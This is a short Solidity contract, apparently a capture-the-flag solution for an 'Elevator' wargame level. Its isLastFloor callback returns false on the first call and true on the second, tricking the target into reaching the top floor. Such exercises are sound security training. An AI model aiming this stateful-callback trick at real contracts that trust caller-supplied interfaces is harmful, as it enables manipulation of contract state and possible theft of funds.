// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Level11.sol";

contract Attack {
    bool switcher;

    function atatatak(address _instance) public {
        Elevator instance = Elevator(_instance);
        instance.goTo(1);
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        if (!switcher) {
            switcher = true;
            return false;
        }

        return switcher;
    }
}
